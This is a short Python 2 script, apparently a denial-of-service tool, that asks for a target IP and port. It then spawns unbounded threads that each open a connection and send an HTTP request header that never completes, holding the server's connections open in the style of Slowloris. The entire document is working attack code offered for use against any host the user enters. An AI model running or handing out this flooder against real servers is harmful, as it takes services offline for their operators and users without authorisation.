#!/usr/bin/python

import socket
import thread

__author__ = "Sumit Shrivastava (@invad3rsam)"
__version__ = "1.0.0b"


def open_conn(ip_address, port):
    s = socket.socket()
    try:
        s.connect((ip_address, port))
        print "[+] Initiating connection...\n\r"
        header = "GET / HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nHost: testphp.vulnweb.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\r\nAccept: */*\r\n"
        s.send(header)
    except:
        print "Unable to open a connection."


def main():
    ip_address = str(raw_input("Enter Target IP : "))
    port = int(raw_input("Enter Target HTTP port : "))
    try:
        while (True):
            thread.start_new_thread(open_conn, (ip_address, port))
    except:
        print "Program encountered an error"


if __name__ == "__main__":
    main()
